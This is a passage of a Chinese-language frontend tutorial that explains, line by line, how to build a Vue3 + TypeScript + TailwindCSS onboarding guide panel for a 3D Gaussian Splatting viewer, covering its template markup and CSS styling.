blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析</h2>
<h2 data-id="heading-1">1.设计稿&amp;效果图</h2>
<p>设计稿：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdca9ad2af844e9688db8998fabf067d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=B1f5nhOj9rxGZ2Z3Kc9GxvvIS24%3D" alt="image-20251203095001272" loading="lazy"/></p>
<p>效果图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bb8714db11f4bada6eae51116978f43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=r1yBW8ucNmq3heWXRkQF96fJcno%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">2.业务背景&amp;业务需求</h2>
<p><strong>业务背景：</strong></p>
<p>产品中使用了 3D 高斯游览（3D Gaussian Splatting）技术，用户可以在三维场景中进行自由浏览、旋转视角、缩放等交互操作。然而，对于首次使用的用户来说，这类 3D 交互存在一定的学习成本。</p>
<p><strong>业务需求：</strong></p>
<p>为降低用户上手难度，需要在 3D 游览开始时在右下角提供一段 操作引导。</p>
<p>该引导用于：</p>
<ul>
<li>清晰说明 “移动视角 / 旋转视角 / 缩放” 的操作方式</li>
<li>通过图示和说明文案提升理解速度</li>
<li>提高用户在 3D 场景中的交互效率与体验</li>
<li>避免用户因不会操作而误以为产品不够友好</li>
</ul>
<p><strong>功能概述：</strong></p>
<p>系统在进入 3D 游览界面时弹出一个指南组件，引导用户理解基础操作。用户可通过左右切换示意图，阅读提示信息，并在了解后点击“知道了”关闭提示</p>
<h2 data-id="heading-3">3.代码设计</h2>
<p>文件结构：</p>
<pre><code class="hljs language-bash" lang="bash">GSview/
├─ components/
│  └─ Guide.vue         <span class="hljs-comment"># 操作引导组件</span>
├─ index.vue            <span class="hljs-comment"># 页面入口</span>
└─ settings.ts          <span class="hljs-comment"># 操作引导配置</span>
</code></pre>
<p>本次的目标就是实现 Guide.vue,一些相关的配置写在 settings.ts 中</p>
<h3 data-id="heading-4">3.1 html骨架</h3>
<p>Guide.vue 中：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isShow"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-header"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-header"</span>&gt;</span>移动视角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">:class</span>=<span class="hljs-string">"[
              'guide-container-tabs-content-item',
              activeTab === item.value ? 'tab-active' : '',
            ]"</span>
            <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in GuideMoveTabConfig"</span>
            <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.value"</span>
            @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleTabClick(item.value)"</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-line"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-header"</span>&gt;</span>旋转视角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">:class</span>=<span class="hljs-string">"[
              'guide-container-tabs-content-item',
              activeTab === item.value ? 'tab-active' : '',
            ]"</span>
            <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in GuideRotateTabConfig"</span>
            <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.value"</span>
            @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleTabClick(item.value)"</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-line"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs guide-container-tabs-last"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-header"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">:class</span>=<span class="hljs-string">"[
              'guide-container-tabs-content-item',
              activeTab === item.value ? 'tab-active' : '',
            ]"</span>
            <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in GuideScaleTabConfig"</span>
            <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.value"</span>
            @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleTabClick(item.value)"</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-content"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-tips"</span>&gt;</span>{{ guideTips }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-img-wrapper"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-arrow-icon"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handlePrev"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">ArrowLeftIcon</span> <span class="hljs-attr">:width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">:height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"#FFFFFF"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"guideImg"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-img"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-arrow-icon"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleNext"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">GuideArrowRight</span> <span class="hljs-attr">:width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">:height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"#FFFFFF"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"confim-btn"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleConfirm"</span>&gt;</span>知道了<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>组件结构概要：</p>
<pre><code class="hljs language-bash" lang="bash">guide-container (整个遮罩层)
 ├ guide-container-header （顶部三组 tab）
 │   ├ guide-container-tabs（移动视角）
 │   │   ├ header
 │   │   └ content -&gt; item
 │   ├ line
 │   ├ guide-container-tabs（旋转视角）
 │   ├ line
 │   ├ guide-container-tabs-last（缩放视角）
 │
 ├ guide-container-content（下半部分）
 │   ├ guide-tips（提示文字）
 │   ├ guide-img-wrapper（左右箭头 + 图片）
 │   ├ confirm-btn（底部按钮）
</code></pre>
<p>部分代码分析：</p>
<pre><code class="hljs language-css" lang="css">:class=<span class="hljs-string">"[
  'guide-container-tabs-content-item',
  activeTab === item.value ? 'tab-active' : '',
]"</span>
</code></pre>
<p>这是Vue 的动态 class 数组写法</p>
<p>上述代码的含义是</p>
<ul>
<li>无论如何都加上 "guide-container-tabs-content-item"</li>
<li>如果当前项是选中项 → 加上 "tab-active"</li>
<li>如果不是选中项 → 加上空字符串（不会渲染）</li>
</ul>
<p>Index.vue中：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">Guide</span> <span class="hljs-attr">v-model:is-show</span>=<span class="hljs-string">"isShowGuide"</span> /&gt;</span>
</code></pre>
<h3 data-id="heading-5">3.2 css样式</h3>
<p>Guide.vue 中：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container</span> {
  <span class="hljs-keyword">@apply</span> flex flex-col absolute bottom-[<span class="hljs-number">26px</span>] right-[<span class="hljs-number">32px</span>] z-<span class="hljs-number">50</span> bg-[#<span class="hljs-number">00000099</span>] rounded-[<span class="hljs-number">10px</span>] overflow-hidden;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">800px</span>;
}

<span class="hljs-selector-class">.guide-container-header</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">32px</span>] bg-[#<span class="hljs-number">1</span>E2128] px-[<span class="hljs-number">40px</span>] pt-[<span class="hljs-number">16px</span>] pb-[<span class="hljs-number">8px</span>] box-border text-[#<span class="hljs-number">88909</span>B] h-[<span class="hljs-number">72px</span>];
}

<span class="hljs-selector-class">.guide-container-tabs</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">24px</span>] items-center h-[<span class="hljs-number">28px</span>];
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
  <span class="hljs-attribute">position</span>: relative;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-header</span> {
  <span class="hljs-attribute">display</span>: none;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
}

<span class="hljs-selector-class">.guide-container-tabs-line</span> {
  <span class="hljs-keyword">@apply</span> w-[<span class="hljs-number">1px</span>] h-[<span class="hljs-number">16px</span>] mx-[<span class="hljs-number">9.5px</span>] my-[<span class="hljs-number">6px</span>] bg-[#<span class="hljs-number">505968</span>];
}

<span class="hljs-selector-class">.guide-container-tabs-header</span> {
  <span class="hljs-keyword">@apply</span> text-[<span class="hljs-number">20px</span>];
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#4884FD</span>;
}

<span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-keyword">@apply</span> text-[<span class="hljs-number">16px</span>] flex gap-[<span class="hljs-number">24px</span>] h-[<span class="hljs-number">28px</span>] items-center;
}

<span class="hljs-selector-class">.guide-container-tabs-content-item</span> {
  <span class="hljs-keyword">@apply</span> cursor-pointer <span class="hljs-attribute">hover</span>:text-[#FFFFFF];
  <span class="hljs-attribute">white-space</span>: nowrap;
}

<span class="hljs-selector-class">.tab-active</span> {
  <span class="hljs-keyword">@apply</span> text-[#FFFFFF] relative;
}

<span class="hljs-selector-class">.tab-active</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">bottom</span>: -<span class="hljs-number">16.75px</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">7.5px</span> solid <span class="hljs-number">#2061fd</span>;
}

<span class="hljs-selector-class">.guide-container-content</span> {
  <span class="hljs-keyword">@apply</span> p-[<span class="hljs-number">32px</span>] box-border;
}

<span class="hljs-selector-class">.guide-tips</span> {
  <span class="hljs-keyword">@apply</span> text-[#FFFFFF] text-[<span class="hljs-number">20px</span>] mb-[<span class="hljs-number">32px</span>] text-center;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.02em</span>;
}

<span class="hljs-selector-class">.guide-img-wrapper</span> {
  <span class="hljs-keyword">@apply</span> relative flex items-center justify-center mb-[<span class="hljs-number">48px</span>] px-[<span class="hljs-number">56px</span>];
}

<span class="hljs-selector-class">.guide-arrow-icon</span> {
  <span class="hljs-keyword">@apply</span> absolute top-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> -translate-y-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> flex items-center justify-center cursor-pointer;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#FFFFFF26</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">37px</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:first</span>-child {
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.guide-img</span> {
  <span class="hljs-attribute">height</span>: <span class="hljs-number">210px</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">580px</span>;
  <span class="hljs-attribute">width</span>: auto;
  <span class="hljs-attribute">object-fit</span>: contain;
}

<span class="hljs-selector-class">.confim-btn</span> {
  <span class="hljs-keyword">@apply</span> w-[<span class="hljs-number">156px</span>] h-[<span class="hljs-number">48px</span>] bg-[#<span class="hljs-number">216</span>BFF] text-[#FFFFFF] text-[<span class="hljs-number">18px</span>] rounded-[<span class="hljs-number">6px</span>] text-center cursor-pointer flex items-center justify-center mx-auto;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.02em</span>;
}
</code></pre>
<p>css分析：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container</span> {
  <span class="hljs-keyword">@apply</span> flex flex-col absolute bottom-[<span class="hljs-number">26px</span>] right-[<span class="hljs-number">32px</span>] z-<span class="hljs-number">50</span> bg-[#<span class="hljs-number">00000099</span>] rounded-[<span class="hljs-number">10px</span>] overflow-hidden;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">800px</span>;
}
</code></pre>
<p>flex flex-col相当于display: flex; flex-direction: column;</p>
<blockquote>
<p>flex布局，文字方向是纵向，也就是垂直排列</p>
</blockquote>
<p>absolute：让这个容器变成 绝对定位。</p>
<blockquote>
<p>相对于最近的 position: relative 的祖先元素</p>
<p>如果没有，则相对于 浏览器视口（viewport）</p>
</blockquote>
<p>bottom-[26px] right-[32px]</p>
<blockquote>
<p>让这个容器固定在右下角，离底部 26px，离右侧 32px。</p>
</blockquote>
<p>z-index: 50;</p>
<blockquote>
<p>让它 叠在几乎所有元素之上</p>
<p>防止被页面其他内容遮住。</p>
</blockquote>
<p>bg-[#00000099]</p>
<blockquote>
<p>#00000099
#000000 = 黑色
99 = 透明度 (~60%)</p>
<p>这是一个半透明黑色的背景 -&gt; 类似“深色面板”</p>
</blockquote>
<p>rounded-[10px]</p>
<blockquote>
<p>rounded-[10px]</p>
</blockquote>
<p>overflow-hidden</p>
<blockquote>
<p>让内部内容裁剪，不会溢出容器外。</p>
</blockquote>
<p>width: 800px;</p>
<blockquote>
<p>固定宽度为 800px。</p>
<p>这让弹窗有固定的大宽度，适合显示图片 + 文案。</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-header</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">32px</span>] bg-[#<span class="hljs-number">1</span>E2128] px-[<span class="hljs-number">40px</span>] pt-[<span class="hljs-number">16px</span>] pb-[<span class="hljs-number">8px</span>] box-border text-[#<span class="hljs-number">88909</span>B] h-[<span class="hljs-number">72px</span>];
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28ecdbf0c04b43dc93551bdd0eaf3b97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=f0YmyH3oWZo6HULuVgbUor%2FUJho%3D" alt="image-20251204161333501" loading="lazy"/></p>
<p>flex gap-[32px] bg-[#1E2128]</p>
<blockquote>
<p>flex布局默认横向排列  设置深灰背景色</p>
<p>gap 只会在兄弟元素之间产生空间32px</p>
<p>[移动视角 tabs]   [竖线]   [旋转视角 tabs]   [竖线]   [缩放视角 tabs]</p>
</blockquote>
<p>px-[40px] pt-[16px] pb-[8px]</p>
<blockquote>
<p>px是左右 的padding-left: 40px;padding-right: 40px;</p>
<p>pt是padding-top: 16px; pb是padding-bottom: 8px;</p>
<p>| ← padding-left 40px → | A | gap 32 | B | gap 32 | C | ← padding-right 40px → |</p>
</blockquote>
<p>box-border</p>
<blockquote>
<p>box-sizing: border-box; padding 和 border 会包含在 height 内部</p>
<p>设定 h-[72px] 时不会撑大元素</p>
</blockquote>
<p>h-[72px]</p>
<blockquote>
<p>高度固定为 72px。</p>
</blockquote>
<p>为什么视觉上，文字下部的空隙要大？</p>
<blockquote>
<p>因为头部固定了高度，上下padding定死了，文字会贴着上padding，所以显得下面大</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs</span> {
  <span class="hljs-keyword">@apply</span> flex gap-[<span class="hljs-number">24px</span>] items-center h-[<span class="hljs-number">28px</span>];
}
</code></pre>
<blockquote>
<p>元素间距24px，items-center 表示垂直方向上居中</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs-line</span> {
  <span class="hljs-keyword">@apply</span> w-[<span class="hljs-number">1px</span>] h-[<span class="hljs-number">16px</span>] mx-[<span class="hljs-number">9.5px</span>] my-[<span class="hljs-number">6px</span>] bg-[#<span class="hljs-number">505968</span>];
}
</code></pre>
<p>定好的分割线</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs-last</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
  <span class="hljs-attribute">position</span>: relative;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-header</span> {
  <span class="hljs-attribute">display</span>: none;
}

<span class="hljs-selector-class">.guide-container-tabs-last</span> <span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
}
</code></pre>
<blockquote>
<p>最后一个tab样式和之前的不太同</p>
<p>所以flex: 1，让他占据剩下的所有空间， position: relative;，为他的子元素绝对定位用</p>
<p>display: none;消除guide-container-tabs-header本身的影响</p>
<p>position: absolute; left: 50%;transform: translateX(-50%); 水平方向居中三件套</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-tabs-content</span> {
  <span class="hljs-keyword">@apply</span> text-[<span class="hljs-number">16px</span>] flex gap-[<span class="hljs-number">24px</span>] h-[<span class="hljs-number">28px</span>] items-center;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26d88064e76a44218895cb7242b516bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=WCfwl3Q52u3N5sXyc1ZkrQWVCPM%3D" alt="image-20251204161601272" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.tab-active</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">bottom</span>: -<span class="hljs-number">16.75px</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">6.25px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">7.5px</span> solid <span class="hljs-number">#2061fd</span>;
}
</code></pre>
<p>纯css三角形技巧，tab项下面的三角形</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-container-content</span> {
  <span class="hljs-keyword">@apply</span> p-[<span class="hljs-number">32px</span>] box-border;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/029846d77c4b43d19480d7e35f3105e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=rkD%2BTfF1U3LuBwDbDB0zdG292OQ%3D" alt="image-20251204153235284" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-tips</span> {
  <span class="hljs-keyword">@apply</span> text-[#FFFFFF] text-[<span class="hljs-number">20px</span>] mb-[<span class="hljs-number">32px</span>] text-center;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.02em</span>;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1908d2dd6b674d479d2d6fbc53326dfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=VtQLpok7oQ%2F8Yi%2F%2FQ%2BQbw7DmG20%3D" alt="image-20251204154318130" loading="lazy"/></p>
<blockquote>
<p>在视觉上，看着可能要大一些，因为本身的图片就有一段空白高度</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-img-wrapper</span> {
  <span class="hljs-keyword">@apply</span> relative flex items-center justify-center mb-[<span class="hljs-number">48px</span>] px-[<span class="hljs-number">56px</span>];
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04116d84b1794b48bf110137ee5a95dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=ZkRZepAOm4WAXONPZUJJhdxXDGY%3D" alt="image-20251204155110774" loading="lazy"/></p>
<p>其中紫色部分是图片并没有被拉满 wrapper，object-fit: contain 自动填的空白</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-img</span> {
  <span class="hljs-attribute">height</span>: <span class="hljs-number">210px</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">580px</span>;
  <span class="hljs-attribute">width</span>: auto;
  <span class="hljs-attribute">object-fit</span>: contain;
}
</code></pre>
<blockquote>
<p>width: auto 宽度跟着图片本身比例自适应</p>
<p>object-fit: contain; —— 图片保持原比例，不能被裁剪,保持原始比例，宁愿留白，也不能拉伸和裁剪</p>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.guide-arrow-icon</span> {
  <span class="hljs-keyword">@apply</span> absolute top-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> -translate-y-<span class="hljs-number">1</span>/<span class="hljs-number">2</span> flex items-center justify-center cursor-pointer;
